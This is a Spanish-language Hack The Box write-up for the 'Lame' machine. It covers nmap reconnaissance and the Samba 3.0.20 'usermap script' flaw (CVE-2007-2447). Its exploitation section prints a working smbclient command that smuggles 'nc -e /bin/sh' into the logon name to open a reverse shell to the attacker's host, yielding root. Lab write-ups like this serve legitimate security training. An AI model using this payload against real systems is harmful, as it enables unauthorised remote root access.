---
title: "HTB: Lame"
description: "Resolución completa de la máquina Lame de Hack The Box."
publishDate: "2024-05-10"
difficulty: "Easy"
os: "Linux"
ip: "10.10.10.3"
tags: ["Samba", "Metasploit", "CVE-2007-2447"]
completed: true
---

# HTB: Lame

## Reconocimiento

Comenzamos realizando un escaneo inicial de puertos con `nmap` para identificar los servicios expuestos en la máquina objetivo:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG allPorts
```

A continuación, lanzamos un escaneo dirigido de versiones y scripts por defecto sobre los puertos abiertos detectados:

```bash
nmap -sCV -p 21,22,139,445 10.10.10.3 -oN targeted
```

## Explotación

El servicio Samba en la versión detectada (Samba 3.0.20) es vulnerable a ejecución remota de comandos mediante la vulnerabilidad conocida como `usermap script` (CVE-2007-2447).

Podemos verificar el acceso o explotar directamente mediante un listener:

```bash
nc -lvnp 4444
```

Y enviando el payload correspondiente a través de `smbclient` o script de explotación:

```bash
smbclient //10.10.10.3/tmp -c 'logon "/=`nohup nc -e /bin/sh 10.10.14.2 4444`"'
```

## Post-Explotación

Una vez obtenida la shell, verificamos privilegios:

```bash
whoami
id
```

La shell obtenida ya cuenta con privilegios de `root`.
